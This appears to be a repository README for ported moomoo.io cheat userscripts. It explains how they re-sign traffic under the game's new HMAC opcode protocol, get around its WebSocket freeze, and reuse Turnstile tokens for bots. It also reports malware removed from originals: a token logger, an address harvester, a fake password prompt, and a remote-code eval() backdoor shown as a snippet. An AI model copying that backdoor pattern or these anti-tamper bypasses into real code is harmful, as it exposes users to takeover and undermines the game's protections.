# moomoo.io userscripts, updated for the current client

Eleven scripts. Nine were current-generation clients that needed the new
transport layer. Two (the LemonMod pair) are a full protocol generation behind
and additionally needed their packet vocabulary mapped forward.

- **`Revelation.user.js`** (file 17, also uploaded as file 11) — a full client
  replacement.
- **`ExternalClient.user.js`** (file 19) — a hook-based mod that runs on top of
  the real game.
- **`LafferRemake.user.js`** (file 24) — a client replacement that hijacks
  `window.WebSocket` to steal the game's server address.
- **`AE86.user.js`** (`ae86 real` V0.1) — same family as the External Client,
  with several bugs of its own on top.
- **`Aurora.user.js`** (`Aurora Client v5.5`) — same family again, plus an
  ALTCHA proof-of-work solver and a private-server redirect.
- **`Robotics.user.js`** (`Robotics Official` v5.5.6) — a fork of the Aurora
  source, so the same family again. A stray line in its metadata block stopped
  it from running at all.
- **`PeterClient.user.js`** (`Peter Client` v11) — hook-based again, with a
  couple of packet names still stuck in the 2019 vocabulary.
- **`UnX.user.js`** (`chicken` v4.6.2, renamed to **unX** on request) — a full
  client replacement that targets moomoo.io *and* a private server still on the
  2019 protocol, so both paths had to keep working.
- **`X18K.user.js`** (`x18k`) — another client replacement that hijacks
  `window.WebSocket`. Also shipped with a wildcard `@include` and a hidden
  token logger; both removed. **Do not run the original.**
- **`LemonMod.user.js`** / **`LemonModVisuals.user.js`** (v3.0) — 2019-era
  protocol; transport fixed, packet vocabulary mapped forward, and the main
  script deobfuscated. `LemonMod.obfuscated.user.js` is the same build before
  deobfuscation, kept as a fallback.

- **`Sakuna.user.js`** (`Sakuna 44`) — hook mod. Shipped with a Google
  home-address harvester, a disguised password prompt and per-frame telemetry;
  all three removed. **Do not run the original.**

- **`Annihilator.v0.8.9.js`** (`v0.8.9`) — hook mod. Two metadata mistakes, each
  fatal on its own, meant not one line of it ever ran. See below.

- **`RoBoTic-CaraMila.v6.9.5.js`** (`v6.9.5`) — hook mod, 15,610 lines. No
  `@run-at` at all, a `@require` it never used, ALTCHA code for a captcha the
  game replaced, a verification box with nowhere to appear, an empty server
  browser, a privacy switch that only worked one way, and an ungated canvas
  filter costing 8× on every player draw. See below.

Plus **`MooUnpatcher.user.js`** — install it once and run old mods unchanged,
instead of patching them one at a time. Version 2 repairs the environment as
well as the protocol, and names whatever is left over. See below.

`reference/` holds the two game bundles they were ported against
(`game-index.js` = file 1, `game-vendor.js` = file 2) for future diffing.
`npm test` runs all the suites.

## Why it broke

The live game changed two things the script depended on, and both of them sit
directly on the path into a match — hence "entry doesn't work".

### 1. The wire protocol is no longer plain msgpack

The server used to accept `msgpack([packetName, args])`. It now runs a
per-connection scheme negotiated in the `io-init` handshake:

```
io-init args -> [ socketId, seed, keyHex, mode ]
```

From that point on:

- Packet names are replaced by **shuffled numeric opcodes**. Two independent
  tables are derived from `seed` (one for client→server, one for
  server→client) via a seeded Fisher–Yates shuffle.
- Every outgoing frame is `[ 6-byte tag | msgpack([opcode, args, seq]) ]`,
  where the tag is a truncated **HMAC-SHA256** over the payload using `keyHex`,
  and `seq` is a per-connection counter.

The old script sent unframed, name-keyed packets, so the server dropped
everything. Incoming packets were worse: it did `handlers[opcode].apply(...)`
on a numeric opcode, which threw `undefined is not a function` on the first
real packet and killed the loading screen.

It also called the connect callback from `onopen`, so it tried to spawn before
`io-init` had arrived and the keys existed.

### 2. The captcha moved from ALTCHA to Cloudflare Turnstile

The script minted `alt:<payload>` tokens by solving ALTCHA's proof-of-work in
web workers. That endpoint is gone; the server now wants a Turnstile token with
a `cf:` prefix. It also never called `captchaCallbackHook()`, so the internal
`ps` gate stayed false and the Enter Game button did nothing on moomoo.io.

## What changed

| Area | Fix |
| --- | --- |
| `RVNP` module (new, top of file) | Seeded PRNG, opcode-table builder, SHA-256, HMAC-SHA256, hex key parsing, captured native `WebSocket.prototype.send`. Ported from the live bundle. |
| `ee.connect` | Parses `io-init`, builds the opcode tables + key, and fires the connect callback **there** instead of on `onopen`. Maps incoming numeric opcodes back to handler names. |
| `ee.send` | Frames packets as `tag ‖ msgpack([opcode, args, seq])`. Unknown packet names are dropped instead of sent as garbage. All mod-side bookkeeping (rate limiter, `moveDir`, hit counter) is untouched. |
| `ee.close` / `onclose` | Clears protocol state so a reconnect renegotiates. |
| Captcha | ALTCHA replaced with Turnstile: explicit-render widget, script loader with retry, `onGotTurnstileToken` / error / expired callbacks, and `cf:` tokens. Widget mount point is created if the page lacks one. |
| Entry gate | Turnstile callback now calls `captchaCallbackHook()`, which is what actually unlocks `Oh()`. |
| Enter Game button | Enable/disable now targets `enterGame`; it was pointed at `itemInfoHolder`. |
| `Oh()` | No longer latches its "already connecting" flag when no token exists, which previously made the first click block entry permanently. |
| Bots | Each bot carries its own `proto` state from its own `io-init`, frames sends the same way, decodes numeric opcodes, and spawns on the handshake instead of a blind 111 ms timer. |
| msgpack | Both `window.msgpack` call sites now use the script's bundled codecs. The `@require` pointed at rawgit.com, which shut down in 2019, so `window.msgpack` was `undefined` and the bot socket was dead on arrival. `@require` removed. |

## The play button did nothing

Reported after the transport fix: the menu loaded, but pressing play showed
`Connecting...` and stopped there forever.

`Oh()` — what the play button calls — returned quietly when it had no Turnstile
token, leaving that message on screen with nothing behind it. The token never
arrived because of how the widget was mounted: `rvnRenderTurnstile()` bailed out
whenever the page's own `#turnstileWidget` already had a child, on the theory
that we could read the token off the page's widget instead. On the live page
that container is *always* filled, and this client hides the page's menu — so
the player never saw that widget to solve it, `getResponse()` stayed empty, and
`code` and `ps` were never set.

Now: a challenge panel of our own (`#rvnCaptcha`, fixed and above the page, with
the widget slot as a plain child so `offsetParent` is never null), rendered
regardless of what the page left lying around. Pressing play without a token
puts the panel up, says `Solve the captcha to play`, and records the intent;
`onGotTurnstileToken` then hides the panel and performs the connect the player
already asked for. The `Fn` latch is still only set once a token really exists,
so no press can permanently block entry.

`test/revelation-entry.js` drives the real `Oh()` and the real widget plumbing
against a DOM stub, starting from a page that has already filled
`#turnstileWidget`, and checks the whole press-play → solve → connect path.

## Known limitation: bots

ALTCHA was a proof-of-work challenge, so the script could solve it locally and
mint a fresh token per bot. Turnstile cannot be solved programmatically. Bot
connections now request a fresh token by resetting the Turnstile widget, and
fall back to reusing the session token. Cloudflare treats tokens as single-use,
so **multi-bot spawning is not reliably automatable any more**. This is a
server-side change, not something the script can work around.

---

# ExternalClient.user.js (file 19)

Same two server changes, but this script is a *hook* mod rather than a client
replacement, so the fix lands differently.

## The ordering problem

The game bundle captures `WebSocket.prototype.send` **once, at load**, and calls
that captured reference for every packet. A hook installed after the bundle
loads never sees the game's traffic at all. The script had no `@run-at`, so it
ran at `document-end` — after the bundle. It now runs at `document-start`, with
only the DOM-free protocol shim at top level and the rest of the script deferred
to `DOMContentLoaded`.

The shim installs a trampoline into `WebSocket.prototype.send` immediately, so
the reference the bundle captures is ours; the client registers its real handler
later through `EXP.setHandler()`.

## What changed

| Area | Fix |
| --- | --- |
| `EXP` shim (new, top of file) | Opcode tables, HMAC-SHA256 framing, per-socket protocol state, send trampoline, Turnstile token capture. |
| msgpack | The script `@require`d msgpack-lite from **rawgit.com, offline since 2019**, so `window.msgpack` was `undefined` and every encode/decode in the file threw. A msgpack codec is now bundled — byte-identical to the game's encoder. |
| Handshake | Every socket gets a listener at construction, because `io-init` lands before the client attaches anything. Each socket (game *and* each bot) keeps its own key, tables and sequence counter. |
| Outgoing | The old `PACKET_MAP` Proxy decoded raw buffers, which no longer parse. Remapping moved into the shim, applied to the string name before the opcode lookup. The shim owns sequence numbering, so packets the client injects sit in the same monotonic run as the game's. |
| Client hook | `applyOutgoing()` extracted from the socket hook so `packet()` and the game's own traffic share one set of rules. Injected packets are framed directly instead of being re-encoded and re-parsed. |
| Incoming | `getMessage()` and `bot.onmessage` map numeric opcodes back to names. |
| Bots / captcha | `window.grecaptcha` is gone — the game uses Turnstile. The shim wraps `window.onGotTurnstileToken` before the bundle installs it to capture the token, and bot URLs use `cf:` instead of `re:`. |
| Trailing junk | Two empty Tampermonkey boilerplate blocks pasted after the end of the code, removed. |

## Known limitations

- **Bots**, same as Revelation: Turnstile tokens are single-use and cannot be
  solved programmatically, so only the first bot is likely to be accepted.
- **`window.leave()`** sent a junk `"kys"` packet to force a disconnect. Unknown
  names are now dropped before they reach the socket, so it no longer does
  anything. The same goes for the other junk packets (`Tick2`,
  `7113213.29154`).
- The game shows a cosmetic "userscript manager detected" banner. It does not
  block play, and nothing here tries to hide it.

---

# LafferRemake.user.js (file 24)

A client replacement, but it gets its connection in an unusual way: it replaces
`window.WebSocket` with an inert stand-in, lets the game build its own server
URL (token included) and call `new WebSocket(url)`, then opens the real socket
itself with the address it caught.

## Why it broke

Three things, on top of the shared protocol change.

**The hijack was too late.** The script had no `@run-at`, so it ran at
`document-end` — after the game bundle. By then the bundle has not only captured
`window.WebSocket`, it has **frozen the property**:

```js
Object.defineProperty(window, "WebSocket", { value: kn, writable: false, configurable: false })
```

So `window.WebSocket = class {...}` was silently ignored, the game connected
normally with its own socket, and `connectSocket()` was never called — the mod
never started. The hijack now lives in a DOM-free shim at `document-start`, with
the rest of the script deferred to `DOMContentLoaded`.

**The protocol.** `io.connect` / `io.send` spoke plain msgpack, and dispatched
incoming packets with `events[type].apply(...)` — an unguarded lookup that
throws on the first numeric opcode.

**The captcha.** The top of the script polled `#altcha_checkbox` /
`#altcha_iframe` and auto-clicked the verify box. Those elements are gone.

## What changed

| Area | Fix |
| --- | --- |
| `LAF` shim (new, top of file) | Opcode tables, HMAC-SHA256, handshake state, and the `window.WebSocket` stand-in — installed at `document-start` so it wins the race against the bundle's freeze. |
| `io.connect` | Reads the seed and key out of `io-init`, fires the connect callback there instead of on `onopen`, and maps numeric opcodes back to handler names. |
| `io.send` | Frames as `tag ‖ msgpack([opcode, args, seq])`. Normalises whatever byte container msgpack-lite returns before hashing. |
| Event dispatch | `events[type]` is guarded, so an unknown packet is ignored instead of throwing. |
| Captcha | The ALTCHA poll is replaced by one that waits for the Turnstile widget to render and then steps aside — the game gates its own Enter Game button on the token, and Turnstile cannot be auto-clicked. |
| msgpack | Removed the dead rawgit `@require`. This script bundles msgpack-lite through its webpack build, so the socket layer was never relying on the CDN. |
| Cleanup | Removed a `console.log(this.socket)` that fired on every connect, and the trailing empty Tampermonkey boilerplate. |

Its 17 packet names all match the current server set exactly, so unlike the
External Client it needs no legacy-name remapping — verified in the tests.

## Note on entry

This mod inherits entry from the game: the game solves Turnstile, builds the
`?token=cf:...` URL, and the shim catches that URL intact. So there is no
separate captcha path to maintain here, and no bot-token limitation — this
script has no bot feature.

---

# AE86.user.js (`ae86 real`)

Same architecture as the External Client — it hooks the socket the game creates
and renders its own view — so it gets the same `EXP` shim, byte for byte (the
tests assert the two copies are identical). What makes this one interesting is
that it had four separate bugs that would each, on their own, stop it dead
before the protocol ever mattered.

## The bugs that killed it on its own lines

**1. A typo in the metadata block.**

```
// @run-at       document_start
```

Underscore, not hyphen. `document_start` is not a valid value, so the manager
falls back to running at the default — after the game bundle. That alone breaks
the socket hook.

**2. A dangling assignment swallowing the next statement.**

```js
let editMainMenu =


// ADD REMOVAL
document.getElementById("wideAdCard").remove();
```

`editMainMenu` is assigned the result of `.remove()` — but more to the point,
`getElementById` returns `null` at document-start (and on any page without that
card), so this threw a `TypeError` on line 25 and **the entire script stopped
there**. Nothing after it ever ran. Now guarded.

**3. It deleted the client it depends on.**

```js
if (scriptTags[i].src.includes("index-f3a4c1ad.js")) scriptTags[i].remove();
```

This script has no socket of its own — it hooks the one the game creates.
Removing the game bundle leaves it with nothing to hook. The hard-coded build
hash stopped matching long ago, so in practice the block was inert, but it is
a loaded gun pointed at the script's own foot. Removed.

**4. It clicked a captcha that no longer exists.** `#altcha_checkbox`, polled
every 10 ms forever. Turnstile replaced ALTCHA and is not a checkbox that can be
auto-clicked. Removed, along with the interval.

Two of the "leaderboard" lines next to the ad removal were also no-ops
(`.append('')`, and `style.color` set to a `text-shadow` string), so they went
with the dead block.

## What else changed

The same set as the External Client: the `EXP` shim at `document-start`, the
rest deferred to `DOMContentLoaded`, framed sends, opcode mapping on both
directions, `applyOutgoing()` extracted so injected packets follow the same
rules, bundled msgpack replacing the dead rawgit `@require`, and `cf:` Turnstile
tokens instead of `re:` reCAPTCHA for bots.

It also had **seven** copies of empty Tampermonkey boilerplate pasted after the
end of the code, the last one truncated mid-block. Removed.

Note that this script sends `"f"` for movement, an old name the current server
has no opcode for — the shim's legacy map turns it into `"9"`. That is asserted
in the tests.

## Known limitations

Same as the others: Turnstile tokens are single-use, so multi-bot spawning is
not reliable; `window.leave()`'s junk `"kys"` packet is dropped before it
reaches the socket.

---

# Aurora.user.js (`Aurora Client v5.5`)

Third script in the External Client family — it hooks the socket the game
creates — so it gets the same `EXP` shim, byte for byte. The tests assert all
three copies are identical.

## What was specific to this one

**No `@run-at`.** Same fatal ordering problem as the others: the hook was
installed after the game bundle had already captured
`WebSocket.prototype.send`. Now `document-start`, with the body deferred.

**An ALTCHA solver running for nothing.** A `static {}` block eagerly allocated
one Web Worker per CPU core (`navigator.hardwareConcurrency`, so typically
8–16), each pulling `js-sha256` from a CDN, to brute-force a proof-of-work
challenge that no longer exists. The pool is now created lazily, so the workers
are only spawned if a widget actually appears — which it will not.

**`window.WebSocket` reassigned twice, unguarded.** Once for the private-server
redirect proxy, once for `WebsocketBot`. The game bundle freezes that property,
so both assignments fail; they are wrapped in `try/catch` now with a warning,
rather than depending on non-strict silent failure. Note the consequence: with
the property frozen, the private-server redirect does not take effect.

**A private-server auto-login that sniffed raw bytes.** It wrapped `nsend` and
msgpack-decoded the outgoing buffer looking for the spawn packet. Outgoing
frames are not plain msgpack any more, so the trigger moved into
`applyOutgoing()`, which already has the decoded packet name.

**Bot tokens.** `AltSolver` mints `alt:<payload>` ALTCHA tokens, which the
server rejects. Switched to the Turnstile token. Note that `botConnect()` starts
with a bare `return;` in this source — the bot feature is disabled by its
author, so this path does not currently run either way.

## What else changed

The shared set: framed sends, opcode mapping in both directions,
`applyOutgoing()` extracted so injected packets follow the same rules, and the
bundled msgpack replacing the `@require` (this one used cdnjs, which is alive,
but the bundled codec is byte-identical to the game's and removes the external
dependency).

Aurora sends `"d"`, an old name with no opcode on the current server; the
shim's legacy map turns it into `"F"`. Asserted in the tests.

---

# LemonMod v3.0 and LemonMod Visuals v3.0

These two target the **2019 moomoo protocol** — a different packet vocabulary
end to end, not just the missing crypto layer the other five needed. They were
broken long before the recent server change.

Reported symptom after the first pass: parts of the mod worked but the game
could not be entered. That was exactly the predicted failure — the spawn packet
is `sp`, which has no opcode on the current server, so it was dropped and no
spawn ever happened.

## The mapping

Rather than guess names — nine of them collide across generations — the map was
derived from **behaviour**.

**Outgoing:** each old call site was matched against the current bundle's call
site with the same shape.

| Evidence | Conclusion |
| --- | --- |
| old `.send("13c", 0, e, t)` / `("13c", 1, e, t)` vs `O.send("c", 0, e, t)` / `("c", 1, e, t)` | `13c` → `c` (store buy/equip) |
| old `.send("33", e)` behind `Math.abs(e - last) > .3` vs `O.send("9", e)` behind the identical guard | `33` → `9` (move) |
| old `.send("c", i, buildIndex >= 0 ? dir() : null)` vs `O.send("F", U, v.buildIndex >= 0 ? Ci() : null)` | `c` → `F` (attack state) |
| old `.send("sp", {name, moofoll, skin})` vs `O.send("M", {…})` | `sp` → `M` (spawn) |

All 17 old outgoing names map onto the 17 current ones — a clean bijection.

**Incoming:** the old handler table has exactly 36 entries, the current one has
exactly 36, in the same order, and sampled handler bodies agree:

- old `h` computes `t - e.health` → current `O` is `updateHealth`
- old `sp` applies `gatherWiggle` along a direction → current `M` is `shootTurret`
- old `mm` stores minimap data → current `7` is `updateMinimap`
- old `pp` measures ping → current `0` is `pingSocketResponse`
- old `t` pushes floating damage text → current `8` is `showText`

The three colliding names — `6`, `9`, `c` — resolve as **old** (upgrade, leave
alliance, attack state), which is what these clients are.

## How it attaches

Both files carry the shared `EXP` shim plus a `LEGACY` block that repoints the
shim's outgoing map at the old vocabulary and wraps `receive()` so the client's
own handler tables — keyed by old names — still fire.

The main script is 3.1 MB and obfuscated, so **its body was never edited**:

- The shim owns `WebSocket.prototype.send` at `document-start`, so the mod's
  `oldSend = WebSocket.prototype.send` captures it and all ~108 send sites
  become reachable from one place.
- `oldSend` is pinned to the framing path through an accessor whose setter
  ignores the mod's assignment. Without this it would route back into the mod's
  own hook, which it is called specifically to bypass. (Caught by the tests.)
- Frames are told apart by **verifying the HMAC**, not guessing: already-framed
  traffic passes through byte-for-byte, plain msgpack gets framed.
- Outgoing uses the inverse of the c2s map, not the incoming one — current
  outgoing `9` is move (old `33`) while incoming `9` is pingMap (old `p`).
  Getting that backwards was a real bug during this work.

The Visuals script also had its connect URL modernised: `host:8008/?gameIndex=N`
is the old endpoint; current servers use the default port and take the token as
the only query parameter.

## Audit of the main (obfuscated) script

The mapping was derived from the Visuals file, so the main script — the one
that actually runs — was checked against it separately.

Verified:

- Its packet-dispatch switch (the one containing `case 'io-init'`) has 16 real
  cases: `1 2 6 7 8 9 11 12 13 16 17 18 33 ac ch h`. Every one is in the
  incoming map — it uses a subset of the same 2019 vocabulary. Other `case`
  labels elsewhere in the file belong to unrelated switches.
- The dispatch decodes through `LEMONMOD_0x5b0f86`, which is declared
  `= msgpack` — the window global. So the socket-aware decode patch does reach
  it. This was not obvious and would have silently broken the whole incoming
  path if it had been a separate object.
- Its message handler is installed with an instance `addEventListener`, so the
  active-socket tracking the decode patch depends on applies.
- Every outgoing path converges on either the mod's hook or `oldSend()`, and
  `oldSend` is pinned to the framing path.

Fixed as a result:

- The mod ships hardcoded malformed byte arrays (7–70 bytes, not valid msgpack)
  that it fires in bursts of 15–21 as a crash exploit. They were falling
  through to a raw native send; on a MAC-authenticated channel the server
  rejects those and may drop the connection, ending the session. They are
  dropped and reported instead.
- Removed the redundant `msgpack` `@require` from lemonmod.com — the shim owns
  `window.msgpack` regardless, and a `@require` that fails to load can stop
  Tampermonkey running the script at all.

Found and deliberately left alone:

- **`case 'io-init'` is dead code.** The dispatch listener is installed on the
  first *send*, which is always after the handshake, so that branch (audio
  volumes, canvas sizing, a resize handler) has never run — not now and not on
  the old protocol either. Making it fire would be a behaviour change nobody
  has ever tested, so it stays as-is.
- The ad-removal helper dereferences `getElementById('adCard').parentNode`
  unguarded and throws on the current page, skipping the rest of its `try`
  block — so the "Mod Creator" element does not render. It *is* inside a
  `try/catch`, so it is cosmetic, not fatal.
- The server-switcher fetches `https://<host>/serverData.js`, the old server
  list endpoint. Affects that feature only, not entry.

## Remaining risk

This fixes packet **names**. Where a payload's *shape* changed between
generations the arguments may still be wrong — that would show up as a specific
feature misbehaving, not as a failure to connect.

Nothing here has been run against the live server.

## lemonmod.com has been severed

Worth knowing why, beyond the dependency being fragile: the script phones home
on startup and one of those calls is a **remote code execution path**.

```js
if ('1' == crCheckResponse) {
    fetch cr.php
    eval(cr.phpResponse);        // arbitrary JS, from a third-party host
}
```

Anyone controlling that host — or able to intercept the request — could run
arbitrary JavaScript on moomoo.io in the user's browser, including reading the
session and the captcha token. The script also posts game state to
`/api/death/` on every death.

Requests to that host are now answered locally, with replies chosen so the
script's own checks pass quietly:

| Request | Canned reply | Why |
| --- | --- | --- |
| `latest.php` | `"3.0"` | matches its own version, so it stops setting the document title to "LemonMod Error!" |
| `crCheck.php` | `"0"` | the `eval(cr.php)` branch can never run |
| anything else | `""`, status 200 | also stops the blocking "An error occured fetching LemonMod resources!" alert |

jQuery now comes from a public CDN. jQuery UI was `@require`d but never used —
not one widget call in the entire file — so it is gone. Only basic jQuery is
used (`.val()`, `.css()`, `$(window).resize`), and none of the APIs removed in
jQuery 3, so the version swap is safe.

Images, sounds and CSS still point at that host and will simply not load. That
is cosmetic.

## Menu theme

The mod's stylesheet lived on lemonmod.com, so severing that host left the menu
unstyled. `tools/lemon-theme.js` replaces it with a self-contained space theme,
injected into the file at build time.

It is **purely additive** — it never renames an id or a class, so every
checkbox, select and tab keeps working exactly as before, and everything is
scoped under `#mm-menu-container` so nothing leaks into the game's own UI.

- three parallax starfields of `box-shadow` dots drifting at different speeds,
  generated from a seeded PRNG rather than hand-written
- shooting stars on staggered delays
- glass sidebar, pill tabs with a glowing accent bar on the active one, custom
  checkboxes, selects, sliders and scrollbars
- the dead remote lemon image is hidden and its `.circle` reused as a ringed
  planet
- no canvas, no images, no timers — it is all CSS, so it costs nothing while
  the menu is closed, and it honours `prefers-reduced-motion`

`npm run preview:menu` renders the real menu markup with the theme and
screenshots it. That caught the first pass putting a 340px planet directly
behind the controls with its ring cutting through the labels; it now sits
dimmed in a corner and the content pane has a scrim so text always wins.

## Deobfuscation

The main script shipped as a javascript-obfuscator build: 3.1 MB, 20k lines,
hex-escaped strings, a string-array indirection, arithmetic-encoded numbers and
dead branches. `npm run deobfuscate` reverses what is mechanically reversible
(`tools/deobfuscate.js`, AST-based via acorn + astring):

| Pass | Count |
| --- | --- |
| hex-escaped string concatenation | `'\x61' + '\x62'` → `'ab'` |
| constant arithmetic folded | 18,046 |
| string-array calls resolved | 228, via 20 forwarding wrappers |
| dead `if ('a' === 'b')` branches pruned | 997 |
| computed member access → dot notation | 3,656 |

3.1 MB / 20,132 lines → **755 KB / 10,147 lines**.

**What it cannot do:** recover the original identifier names. The obfuscator
destroyed them, so `_0x1a2b3c` stays `_0x1a2b3c`. It is readable, not restored.

Equivalence checks that passed:

- the obfuscator's own string array evaluates to a **byte-identical** 78-entry
  result from both files
- the packet-dispatch switch has the **same 17 cases** in the same order
- the hand-written blocks are passed through verbatim, so their comments survive
  (astring would otherwise drop every comment)
- the full test suite passes against the deobfuscated file

Branch pruning never discards a branch containing a `var` or function
declaration, since those hoist and could be referenced from outside — the
function count drop (884 → 740) is dead code the pruner removed.

---

---

# MooUnpatcher.user.js — fix any mod without editing it

Install it once, order it **above** the mod in your userscript manager, then
install the old mod unchanged.

## How it works

Mods of this family are all built the same way:

```js
WebSocket.prototype.nsend = WebSocket.prototype.send;   // saves whatever is there
WebSocket.prototype.send  = function (buf) {            // installs its own hook
    ...inspect/mutate plain msgpack...
    this.nsend(binary);                                 // hands it back
};
```

The unpatcher runs at `document-start`, so the reference the mod saves is
*ours*, and the reference the game captured at bundle load is ours too. That
puts it on **both sides** of the mod: it hands the mod plain msgpack going out
and takes plain msgpack back, framing at the boundary. The mod never learns the
wire changed.

`nsend`, `oldSend`, `staticSend`, `originalSend` and `realSend` are pinned via
accessors whose setters ignore assignment — a plain assignment would route those
calls back into the hook the mod is trying to bypass.

## Generation auto-detection

`6`, `9`, `c`, `2`, `5`, `7`, `8` exist in both the 2019 and current
vocabularies **meaning different packets**, so nothing can be translated until
the generation is known. But some names appear in exactly one generation —
`sp`, `ch`, `33`, `pp`, `rmd`, `13c` are old-only; `M`, `D`, `e`, `z`, `b`, `K`
are current-only. The first one seen settles it, and in practice the very first
packet a mod sends is its spawn: `sp` or `M`.

## Incoming

The game decodes with its own bundled codec straight off the raw event, so
rewriting every message would break it. But a hook mod always attaches *after*
the game has already set `onmessage` on that socket — so a listener registered
once an `onmessage` exists is the mod's, and only those get the rewritten copy.
The game keeps seeing raw numeric opcodes; the mod sees the names it was
written against. Both are asserted in the tests.

That rule has one blind spot: a **full client replacement** is the *first*
handler on its socket, because there is no game bundle underneath it, so the
ordering rule mistakes it for the game and hands it raw opcodes. v2 adds a
second, independent signal — a stack trace taken where the handler is
installed. A frame from `chrome-extension://`, `moz-extension://` or a manager's
`userscript.html` wrapper can only be a mod. It can only ever promote *game* to
*mod* on positive evidence, so a manager that injects without leaving a trace
(Violentmonkey's page mode) falls back to the ordering rule unchanged and
nothing that worked before can start failing.

---

# What v2 added: the other half of every hand fix

The transport was never why most of these mods were dead. Each one repaired by
hand in this project needed the *same handful* of non-protocol fixes as well,
and a mod that throws on line 25 never reaches the socket at all. Those fixes
are now shims, so they apply to any mod:

| What breaks | What v2 does |
|---|---|
| `getElementById("adCard").parentNode` — the ad teardown every mod of this era opens with. The elements are gone; the mod dies before drawing a menu. | For a **closed list of 19 removed ids only**, hand back a real but hidden element, parented so `.parentNode.removeChild` and `.parentElement.style` work too. Hiding, removing or writing into it are exactly the no-ops the mod wanted. Extend with `window.UNPATCH_EXTRA_IDS`. |
| `unsafeWindow`, `GM_getValue`, `GM_setValue`, `GM_addStyle`, … — undefined under `@grant none`, and a `ReferenceError` at the top level kills the *whole* script. | All of them shimmed, storage backed by `localStorage` under a namespaced key, plus the promise-shaped `GM.*` namespace. `unsafeWindow` is genuinely the page window under `@grant none`, so that one is a shim and not a workaround. |
| A dead CDN `@require` for msgpack. | `window.msgpack`, `window.msgpack5()` and the `{Encoder, Decoder}` classes — three dialects, same two functions, so no mod has to care which library it was written against. |
| A stale connect token. The bundle sends `?token=` + `"cf:" + turnstileToken`; a mod written against reCAPTCHA sends something else, the server closes the socket, and it looks exactly like being stuck on *Connecting*. | The socket URL is repaired on the way into the constructor: a token that is already `cf:` is left alone, a stale one is replaced, a missing one is added. **Game sockets only** — a captcha token is a credential, and these mods really do open sockets to hosts of their own (jester talks to two `glitch.me` projects). Qualifying means the page's own registrable domain, or a URL already carrying an `alt:`/`re:`/`cf:` token so private servers still work. |
| Two sequence counters on one socket. The bundle frames its own packets with `const n = ++Z.seq` and hands us the finished frame; the shim's `EXP.send` counts separately, so the moment a mod injects anything the two collide. | Already-framed traffic is renumbered into the shim's run — same opcode, same arguments, re-signed — instead of passing through. For a game-only stream both counters step together, so it costs nothing until it matters. |
| The bundle freezes the constructor at boot — `Object.defineProperty(window, "WebSocket", {value: kn, writable: false, configurable: false})` — silently disabling any mod that wraps it. | `window.WebSocket` is installed as a **non-configurable accessor**, which turns that pin into a `TypeError` the bundle already swallows in its own `catch {}`. The property stays ours *and* stays assignable. |
| A missing `@run-at document-start` in the mod. | Already handled, and now documented: the reference the game captured is ours either way, so a late mod's hook is still picked up. |

## And when it still breaks, it says why

The point of all this is that you stop reading a mod line by line to find out
why it is dead. Every uncaught error is matched against the failure modes this
family actually has:

```
[unpatch] a script threw: GM_setValue is not defined
       -> "GM_setValue" is a userscript-manager API that does not exist under
          "@grant none". The unpatcher shims it -- make sure it is ordered
          ABOVE the mod.
```

and `unpatch.report()` prints everything the shim did — generation detected,
packets framed, names it had to drop, shims installed, placeholders handed out,
errors seen. That one object is usually enough to say what a mod needs.

## What it still does not do

- **Mods that scrape the game bundle** for its minified variable names. Those
  break on every rebuild and need a real edit — the report says so by name.
- **Payload shape changes**, as opposed to packet renames.
- **Stacking on an already-repaired script.** A mod that frames its own packets
  does not need this, and running both puts two sequence counters on one
  socket. It keeps working, and warns once.

So it fixes the protocol *and* the environment for you. It is still not a
promise that a given mod works — but when one does not, it tells you why.

## How it is checked

`test/unpatcher.js` drives it with two synthetic mods (one 2019-generation, one
current) against a server built from the game bundle's own crypto, and asserts
every shim above — 77 checks.

A node harness with a hand-written fake DOM can only go so far, though: the
fake is a *model* of the browser, and the model is the thing under test. So
`tools/probe-unpatcher.js` loads the shim into a real Chromium, on a page that
behaves the way moomoo.io does (ads already gone, `WebSocket` frozen after we
load), and bolts on a synthetic mod that commits **all seven** boot mistakes at
once — every one taken from a real script in this repo. It reports whether that
mod survived. It does.

`tools/probe-mod.js <file>` does the same for **any** mod you hand it: it reads
every id the mod looks up (including through a `getEl`-style wrapper), builds a
page that has them, loads the unpatcher and then the mod, and reports what threw
and on which line. Running it on `jester mod 11` — a 10,910-line hook mod whose
msgpack `@require` still points at rawgit — reports no errors, `window.msgpack`
present and the mod's socket hook installed. Two of the failures in its first
run were the probe's fault, not the mod's (a missing `getEl` id, and a `<div>`
where the page has a `<canvas>`); both are fixed, which is the point of running
it rather than reading the file.

---

# RoBoTic-CaraMila.v6.9.5.js (v6.9.5)

A hook mod of the usual shape, so it gets the usual `EXP` shim and the same
deferred boot as Annihilator — `node tools/build-caramila.js` rebuilds it from
`reference/caramila-original.js`. Four things are specific to it.

## No `@run-at` at all

Not a typo this time, simply absent, which means `document-end`. The game
captures `WebSocket.prototype.send` at bundle load, so by the time this
installed its hook it was decorating a function nothing called. It ran, drew its
menu, and sent nothing.

## A `@require` it never used

Two CDN requires: msgpack-lite, replaced by the bundled shim, and **three.js
r134** — `THREE.` appears **zero** times in 15,610 lines. Both dropped.

## ALTCHA

The mod hides moomoo's old ALTCHA widget and clicks its checkbox once a second.
moomoo replaced ALTCHA with Cloudflare Turnstile, so `getEl("altcha")` is null
and `altcha.style.display` is a TypeError. The game solves Turnstile itself, so
there is nothing left to click: the dereference is guarded and the poll retires
itself.

The ad elements are handled the way the unpatcher handles them — `getEl` returns
a hidden stub for a closed list of ids moomoo deleted, and null for everything
else. `altcha` is deliberately **not** on that list, because it has to stay null
for the poll to notice and stop.

## The verification box had nowhere to appear

The mod builds its own `inputCard` and then hides the game's `setupCard`.
`#turnstileWidget` lives **inside** that card, and the game will not render into
something that is not laid out:

```js
const e = document.getElementById("turnstileWidget");
if (!e || e.offsetParent === null) return !1;
```

So no checkbox ever appeared, no token was ever issued, and Play stayed
`disabled` for ever — the game only clears that class from
`onGotTurnstileToken`. Reported from a photo of the real menu: name, skins,
Play, and nothing to verify with.

Moving the widget into the visible card is the whole fix. The game polls for it
every 150 ms for about fifteen seconds, so it renders itself once it can be
seen; it now sits directly under the name-and-Play row, which is what it gates.
The fallback render is only for a mod that booted too late to catch that
window — it waits three seconds so the game gets first refusal, uses the game's
own sitekey and callbacks, and stands down the moment anything has been
rendered into the widget, so the two can never both render.

Measured with the exact test the game applies, against a page where the widget
starts inside the hidden card as it really does:

| | `stillInsideHiddenSetupCard` | `gameWouldRender` |
|---|---|---|
| before | `true` | **`false`** |
| after | `false` | **`true`** |

## The server browser came up empty

`getServers()` has no `catch` anywhere above it, so anything that goes wrong in
there leaves the panel silently blank — no list, no error, nothing.

